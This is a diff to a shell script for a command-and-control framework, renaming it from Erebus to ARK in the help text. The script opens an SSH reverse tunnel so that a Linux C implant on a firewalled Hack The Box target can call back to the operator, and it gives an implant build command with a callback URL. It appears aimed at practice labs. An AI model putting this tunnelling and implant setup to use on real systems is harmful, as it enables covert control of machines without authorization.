@@ -3,7 +3,7 @@
 # localhost so a Linux C implant can CALLBACK_URL=https://127.0.0.1:<remote_port>
 # when the target has no route to the operator VPN (FireFlow, DarkZeroReturns).
 #
-# Preferred: erebus inbound tunnel user@TARGET  (same ssh -R, plus inbound status/env).
+# Preferred: ark inbound tunnel user@TARGET  (same ssh -R, plus inbound status/env).
 #
 # Usage:
 #   ./scripts/htb_reverse_tunnel.sh user@10.129.x.x
@@ -24,7 +24,7 @@ SSH_OPTS="${SSH_OPTS:-}"
 
 if [[ -z "$TARGET" || "$TARGET" == "-h" || "$TARGET" == "--help" ]]; then
   cat <<'EOF'
-htb_reverse_tunnel.sh — SSH reverse tunnel for Erebus C2 on firewalled HTB Linux
+htb_reverse_tunnel.sh — SSH reverse tunnel for ARK C2 on firewalled HTB Linux
 
   ./scripts/htb_reverse_tunnel.sh user@TARGET_IP
 
@@ -36,7 +36,7 @@ Env:
 Build implant for tunnel callback:
   make implant-c-linux \\
     CALLBACK_URL=https://127.0.0.1:8443 \\
-    CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \\
+    CA_CERT_PATH=$HOME/.ark/ca-cert.pem \\
     SLEEP_MS=500
 
 Deploy (example):
